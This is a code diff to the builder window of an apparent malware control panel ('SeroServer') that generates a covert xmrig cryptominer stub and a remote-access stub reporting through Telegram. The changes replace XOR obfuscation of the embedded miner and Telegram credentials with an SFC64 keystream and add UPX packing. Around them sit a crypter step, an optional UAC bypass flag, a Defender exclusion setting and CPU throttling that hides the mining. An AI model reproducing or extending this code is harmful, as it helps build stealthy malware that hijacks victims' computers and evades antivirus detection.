@@ -63,14 +63,23 @@ public partial class ServerWindow : Window
     private readonly Dictionary<string, Window> _featureWindows = new();
     private byte[]? _bldXmrigBytes;
     private string? _bldXmrigPath;
-    private byte[]? _bldXorKey;    // per-build random XOR key; encrypts embedded xmrig
+    private byte[]? _bldSfcSeed;   // per-build 32-byte SFC64 seed; encrypts embedded xmrig
 
-    private static byte[] XorBytes(byte[] data, byte[] key)
+    private static byte[] SfcEncode(byte[] data, byte[] seed)
     {
-        var result = new byte[data.Length];
+        var out_ = new byte[data.Length];
+        ulong a = BitConverter.ToUInt64(seed, 0),  b = BitConverter.ToUInt64(seed, 8),
+              c = BitConverter.ToUInt64(seed, 16), d = BitConverter.ToUInt64(seed, 24);
         for (int i = 0; i < data.Length; i++)
-            result[i] = (byte)(data[i] ^ key[i % key.Length]);
-        return result;
+        {
+            ulong k = a + b + d; d++;
+            a = b ^ (b >> 11);
+            b = c + (c << 3);
+            c = (c << 24) | (c >> 40);
+            c += k;
+            out_[i] = (byte)(data[i] ^ (byte)k);
+        }
+        return out_;
     }
 
     private static string ConfigFilePath
@@ -1788,21 +1797,11 @@ public partial class ServerWindow : Window
         const string hookDllLine   = "    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();";
         const string hookDll32Line = "    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();";
 
-        // Per-build random XOR key for Telegram credentials
-        var telegramXorKeyBytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(32);
-        var telegramXorKey = telegramXorKeyBytes;
+        // Per-build random SFC64 seed for Telegram credentials
+        var telegramSfcSeedBytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(32);
         static string ByteArrayLiteral(byte[] b) =>
             "new byte[] { " + string.Join(", ", b.Select(x => x.ToString())) + " }";
-        static byte[] XorEncode(string s, byte[] key)
-        {
-            if (string.IsNullOrEmpty(s)) return Array.Empty<byte>();
-            var src = System.Text.Encoding.UTF8.GetBytes(s);
-            var out2 = new byte[src.Length];
-            for (int i = 0; i < src.Length; i++) out2[i] = (byte)(src[i] ^ key[i % key.Length]);
-            return out2;
-        }
-        string BuildXorBytes(string s, byte[] key) => ByteArrayLiteral(XorEncode(s, key));
-        string telegramXorKeyLiteral = ByteArrayLiteral(telegramXorKeyBytes);
+        string telegramSfcSeedLiteral = ByteArrayLiteral(telegramSfcSeedBytes);
 
         return $@"namespace SeroStub;
 
@@ -1848,12 +1847,12 @@ internal static class Config
 {hookDllLine}
 {hookDll32Line}
 
-    // Telegram notification (XOR-encoded — never stored as plaintext in binary)
+    // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
     public const bool TelegramEnabled = {(BldTelegramEnabled.IsChecked == true ? "true" : "false")};
-    public static readonly byte[] TelegramTokenXor   = {BuildXorBytes(BldTelegramToken.Text.Trim(), telegramXorKey)};
-    public static readonly byte[] TelegramChatId1Xor = {BuildXorBytes(BldTelegramChatId1.Text.Trim(), telegramXorKey)};
-    public static readonly byte[] TelegramChatId2Xor = {BuildXorBytes(BldTelegramChatId2.Text.Trim(), telegramXorKey)};
-    public static readonly byte[] TelegramXorKey     = {telegramXorKeyLiteral};
+    public static readonly byte[] TelegramTokenSfc   = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramToken.Text.Trim()),   telegramSfcSeedBytes))};
+    public static readonly byte[] TelegramChatId1Sfc = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramChatId1.Text.Trim()), telegramSfcSeedBytes))};
+    public static readonly byte[] TelegramChatId2Sfc = {ByteArrayLiteral(SfcEncode(System.Text.Encoding.UTF8.GetBytes(BldTelegramChatId2.Text.Trim()), telegramSfcSeedBytes))};
+    public static readonly byte[] TelegramSfcSeed    = {telegramSfcSeedLiteral};
 }}
 ";
     }
@@ -1918,12 +1917,12 @@ internal static class Config
         int.TryParse(BldMnrCpuIdle.Text,       out int cpuIdle);   if (cpuIdle   < 0 || cpuIdle   > 100) cpuIdle   = 75;
         int.TryParse(BldMnrCpuActive.Text,     out int cpuActive); if (cpuActive < 0 || cpuActive > 100) cpuActive = 50;
         int.TryParse(BldMnrIdleSec.Text,       out int idleSec);   if (idleSec  < 5)                    idleSec   = 30;
-        if (_bldXorKey == null)
+        if (_bldSfcSeed == null)
         {
-            Log("[!] Miner: XOR key not initialized — run 'Load xmrig' first.");
+            Log("[!] Miner: SFC seed not initialized — run 'Load xmrig' first.");
             return "";
         }
-        string xorKeyB64 = Convert.ToBase64String(_bldXorKey);
+        string sfcSeedB64 = Convert.ToBase64String(_bldSfcSeed);
 
         return $@"namespace MinerStub;
 
@@ -1950,7 +1949,7 @@ internal static class MinerConfig
     public const bool   EnableDefenderExclusion  = true;
     public const string StatsUrl         = ""{Esc(BldMnrStatsUrl.Text.Trim())}"";
     public const string StatsToken       = ""{Esc(BldMnrStatsToken.Text.Trim())}"";
-    public const string XorKey           = ""{xorKeyB64}"";
+    public const string SfcSeed          = ""{sfcSeedB64}"";
 }}
 ";
     }
@@ -1983,9 +1982,9 @@ internal static class MinerConfig
 
         try
         {
-            // Generate random XOR key for this build, then write encrypted MinerConfig + xmrig.bin
-            _bldXorKey = new byte[64];
-            System.Security.Cryptography.RandomNumberGenerator.Fill(_bldXorKey);
+            // Generate random SFC64 seed for this build, then write encrypted MinerConfig + xmrig.bin
+            _bldSfcSeed = new byte[32];
+            System.Security.Cryptography.RandomNumberGenerator.Fill(_bldSfcSeed);
 
             var cfgPath = Path.Combine(minerDir, "MinerConfig.cs");
             var minerCfg = GenerateMinerConfigCs();
@@ -2000,7 +1999,7 @@ internal static class MinerConfig
                 using (var deflate = new System.IO.Compression.DeflateStream(compMs, System.IO.Compression.CompressionLevel.Optimal, leaveOpen: true))
                     deflate.Write(_bldXmrigBytes, 0, _bldXmrigBytes.Length);
                 var compressed = compMs.ToArray();
-                await File.WriteAllBytesAsync(xmrigBinDst, XorBytes(compressed, _bldXorKey));
+                await File.WriteAllBytesAsync(xmrigBinDst, SfcEncode(compressed, _bldSfcSeed!));
             }
 
             TxtMnrBuildStatus.Text = "Compiling (NativeAOT)…";
@@ -2054,6 +2053,34 @@ internal static class MinerConfig
                 Log("[*] MinerBuilder: applying C++ crypter…");
                 try { await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconPath: null, metadata: null, uacBypass: false); Log("[+] MinerBuilder: crypter applied."); }
                 catch (Exception cex) { Log($"[!] MinerBuilder: crypter skipped — {cex.Message}"); }
+            }
+
+            if (BldMnrUpx.IsChecked == true)
+            {
+                TxtMnrBuildStatus.Text = "Compressing (UPX)…";
+                Log("[*] MinerBuilder: Running UPX…");
+                string upxExe = "upx";
+                var toolsUpx = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "upx.exe");
+                if (File.Exists(toolsUpx)) upxExe = toolsUpx;
+                var upxPsi = new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = upxExe,
+                    Arguments = $"--best --lzma \"{outputExe}\"",
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                };
+                try
+                {
+                    using var upxProc = System.Diagnostics.Process.Start(upxPsi)!;
+                    await upxProc.StandardOutput.ReadToEndAsync();
+                    await upxProc.StandardError.ReadToEndAsync();
+                    await upxProc.WaitForExitAsync();
+                    if (upxProc.ExitCode == 0) Log("[+] MinerBuilder: UPX compression applied.");
+                    else Log($"[!] MinerBuilder: UPX failed (exit {upxProc.ExitCode}) — skipped.");
+                }
+                catch { Log("[!] MinerBuilder: UPX not found — skipped. Put upx.exe in PATH or tools/."); }
             }
 
             // Generate PS1 uninstaller script
